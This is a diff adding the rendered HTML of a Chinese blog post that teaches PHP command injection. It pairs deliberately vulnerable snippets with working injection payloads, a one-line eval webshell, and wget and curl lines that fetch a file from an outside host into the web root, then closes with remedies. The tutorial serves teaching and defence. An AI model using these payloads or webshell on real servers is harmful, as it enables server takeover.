@@ -1,32 +1,409 @@
-extends includes/layout.pug
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
-        
-    if theme.reward.enable && theme.reward.QR_code
-      !=partial('includes/post/reward', {}, {cache: true})
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>任意命令执行 - Zylx77</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="任意命令执行命令执行漏洞的概述12程序员使用脚本语言(...">
+  <meta name="author" content="John Doe">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
+  
+<link rel="stylesheet" href="/css/style.css">
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
       
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: true,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">任意命令执行</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 摄影</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">任意命令执行</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>十月 18, 2022</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>3720</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h2 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h2><h4 id="命令执行漏洞的概述"><a href="#命令执行漏洞的概述" class="headerlink" title="命令执行漏洞的概述"></a>命令执行漏洞的概述</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">程序员使用脚本语言(比如PHP)开发应用程序过程中，脚本语言开发十分快速、简洁，方便，但是也伴随着一些问题。比如说速度慢，或者无法接触系统底层，如果我们开发的应用,特别是企业级的一些应用需要去调用一些外部程序。</span><br><span class="line">!!!当应用需要调用一些外部程序时就会用到一些执行系统命令的函数。!!!</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。</span><br></pre></td></tr></table></figure>
+
+<h6 id="命令执行相关函数"><a href="#命令执行相关函数" class="headerlink" title="命令执行相关函数"></a>命令执行相关函数</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system(args) 有回显</span><br><span class="line">passthru(args)(有回显)</span><br><span class="line">exec(args,$arr)  （回显最后一行-必须echo输出,也可以传递数组显示出来）</span><br><span class="line">shell_exec(args) （无回显-必须输出）</span><br><span class="line">反引号：`` </span><br><span class="line">popen(handle,mode)(无回显) ,打开是资源需配合fread读或fget读 </span><br><span class="line">proc_open(&#x27;cmd&#x27;,&#x27;flag&#x27;,&#x27;flag&#x27;)（无回显）</span><br><span class="line">$process = proc_open(&#x27;dir&#x27;,$des,$pipes);</span><br><span class="line">echo stream_get_contents($pipes[1]);</span><br></pre></td></tr></table></figure>
+
+<h6 id="System-函数漏洞利用-1-——整个控制"><a href="#System-函数漏洞利用-1-——整个控制" class="headerlink" title="System()函数漏洞利用(1) ——整个控制"></a>System()函数漏洞利用(1) ——整个控制</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$arg</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&quot;<span class="subst">$arg</span>&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/?cmd=id</span><br><span class="line">/?cmd=pwd</span><br><span class="line">/?cmd=ifconfig</span><br></pre></td></tr></table></figure>
+
+<h6 id="System-函数漏洞利用-2-——-ping"><a href="#System-函数漏洞利用-2-——-ping" class="headerlink" title="System()函数漏洞利用(2)——-ping"></a>System()函数漏洞利用(2)——-ping</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$arg</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping  <span class="subst">$arg</span>&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>  &gt; comm.php   在cmd中写入文件的命令</span><br><span class="line"></span><br><span class="line">&amp;&amp;需要编码(%<span class="number">26</span>%<span class="number">26</span>),浏览器不能识别</span><br><span class="line"></span><br><span class="line">?cmd=<span class="number">127.0</span>.<span class="number">0.1</span>%<span class="number">26</span>%<span class="number">26</span><span class="keyword">echo</span> <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>  &gt; he.php</span><br><span class="line">    如果双引号被过滤了,使用 ^ 可以代替双引号</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?cmd=easdych||whoami</span><br><span class="line"></span><br><span class="line">	我们能够控制的点是程序的整个参数，我们可以直接用&amp;&amp;或||等等，利用与、或、管道命令来执行其他命令。</span><br><span class="line">	/?cmd=<span class="number">127.0</span>.<span class="number">0.1</span>| ifconfig</span><br><span class="line"><span class="title function_ invoke__">System</span>(“ping –c <span class="number">3</span> <span class="number">127.0</span>.<span class="number">0.1</span>; ifconfig)</span><br><span class="line"></span><br><span class="line">Llinux 下支持分号 ”;”</span><br><span class="line">|，||，%<span class="number">26</span>，%<span class="number">26</span>%<span class="number">26</span>，</span><br><span class="line">短路逻辑与  %<span class="number">26</span>%<span class="number">26</span> 前后两个参数，如果第一为假，第二个不判断</span><br><span class="line">短路逻辑 或 ||前后两个参数，如果第一为真，第二个不判断</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h6 id="System-函数漏洞利用-3-—–查看目录"><a href="#System-函数漏洞利用-3-—–查看目录" class="headerlink" title="System()函数漏洞利用(3)—–查看目录"></a>System()函数漏洞利用(3)—–查看目录</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$arg</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;dir \&quot;<span class="subst">$arg</span>\&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ls –al “”;ifconfig;”</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?cmd=./<span class="string">&quot;%26%26whoami||&quot;</span></span><br><span class="line">?cmd=./<span class="string">&quot;|whoami||&quot;</span></span><br><span class="line">    </span><br><span class="line">?cmd=/home” ; ifconfig;”	</span><br><span class="line">?cmd=/home” || ifconfig;”</span><br><span class="line">?cmd=/home” %<span class="number">26</span> ifconfig;”</span><br><span class="line">?cmd=/home” %<span class="number">26</span>%<span class="number">26</span> ifconfig;”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">一个 | --&gt;前面为真,就执行后面的</span><br></pre></td></tr></table></figure>
+
+<h6 id="短路与逻辑"><a href="#短路与逻辑" class="headerlink" title="短路与逻辑"></a>短路与逻辑</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">短路与&amp;&amp;的特点，前面如果为真，才执行后面的，如果为假，后面不执行。</span><br><span class="line"><span class="comment">// 逻辑与&amp;的特点，前面无论真假，后面都执行,并且打印后面的值.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 短路或||的特点，前面如果为真，后面的不执行了，前面为假，后面执行</span></span><br><span class="line"><span class="comment">// 逻辑或|前面为真，后面都执行,并且打印后面的值.</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="System-函数漏洞利用-4-—–写文件"><a href="#System-函数漏洞利用-4-—–写文件" class="headerlink" title="System()函数漏洞利用(4)—–写文件"></a>System()函数漏洞利用(4)—–写文件</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$arg</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;<span class="subst">$arg</span>&#x27; &gt; 1.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">123</span><span class="string">&#x27;|whoami||&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在单引号内的话，变量不能被解析，因此要想执行命令必须闭合单引号。</span></span><br><span class="line"><span class="string">	/cmd?= 12’|whoami||echo ‘</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="passthru-exec-shell-exec函数漏洞利用"><a href="#passthru-exec-shell-exec函数漏洞利用" class="headerlink" title="passthru/exec/shell_exec函数漏洞利用"></a>passthru/exec/shell_exec函数漏洞利用</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);  ---不需要<span class="keyword">echo</span>,也有回显</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); ----需要<span class="keyword">echo</span>才有回显,否则没有回显</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$arr</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);---可以用数组方式打印,也可以直接使用var_dump打印</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);---只能<span class="keyword">echo</span>打印,不能使用数组方式</span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span class="number">1</span>]`;  ---反引号也可以执行命令,只能<span class="keyword">echo</span>打印</span><br></pre></td></tr></table></figure>
+
+<h6 id="proc-open函数漏洞利用"><a href="#proc-open函数漏洞利用" class="headerlink" title="proc_open函数漏洞利用"></a>proc_open函数漏洞利用</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$des</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// 标准输入，子进程从此管道中读取数据</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// 标准输出，子进程向此管道中写入数据</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;./error-output.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="comment">// 标准错误，写入到一个文件</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>], <span class="variable">$des</span>, <span class="variable">$pipes</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]); ----------只能<span class="keyword">echo</span>打印</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">如果有写权限的话</span><br><span class="line"><span class="number">1</span>、反弹shell，尝试提权</span><br><span class="line"><span class="number">2</span>、执行pwd得到绝对路径，写一句话木马：</span><br><span class="line">?cmd=<span class="keyword">echo</span> ^<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()?^&gt; &gt; /<span class="keyword">var</span>/www/html/info.php </span><br><span class="line">?cmd=wget -O /<span class="keyword">var</span>/www/html/info.php http:<span class="comment">//www.xx.com/phpinfo.txt</span></span><br><span class="line">?cmd=curl http:<span class="comment">//www.xx.com/phpinfo.txt &gt; /var/www/html/info.php </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="test22/image-20221013171434912.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">alt</span></p>
+<h6 id="popen函数漏洞利用"><a href="#popen函数漏洞利用" class="headerlink" title="popen函数漏洞利用"></a>popen函数漏洞利用</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&#x27;r&#x27;</span>)  ------只能<span class="keyword">echo</span>打印</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$f</span> =<span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>,<span class="number">1024</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">继承Web服务器程序的权限，去执行系统命令</span><br><span class="line">继承Web服务器程序的权限，读写文件 echo ^&lt;?php eval($_POST[1]); ?^&gt; &gt; 1.php</span><br><span class="line">反弹shell</span><br><span class="line">控制整个网站</span><br><span class="line">甚至控制整个服务器</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">能使用脚本解决的工作，不要调用其他程序处理，尽量少用执行命令的函数，并在disable_functions中禁用。</span><br><span class="line">在进入命令执行的函数或方法之前，对参数进行过滤。使用这些函数escapeshellcmd / escapeshellarg过滤</span><br><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">escapeshellcmd  shell 元字符转义</span><br><span class="line">参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</span><br><span class="line">exec() 函数中数据，避免用户可控。</span><br></pre></td></tr></table></figure>
+
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>John Doe</li>
+    <li><strong>本文链接：</strong><a href="https://zylx77.github.io/2022/10/18/ren-yi-ming-ling-zhi-xing/index.html" title="https:&#x2F;&#x2F;zylx77.github.io&#x2F;2022&#x2F;10&#x2F;18&#x2F;ren-yi-ming-ling-zhi-xing&#x2F;index.html">https:&#x2F;&#x2F;zylx77.github.io&#x2F;2022&#x2F;10&#x2F;18&#x2F;ren-yi-ming-ling-zhi-xing&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+        
+  <nav class="nav">
+    <a href="/2022/10/18/zyl-test11/"><i class="iconfont iconleft"></i>zyl-test11</a>
+    <a href="/2022/10/18/hello-world/">Hello World<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">任意命令执行</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=894519210 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
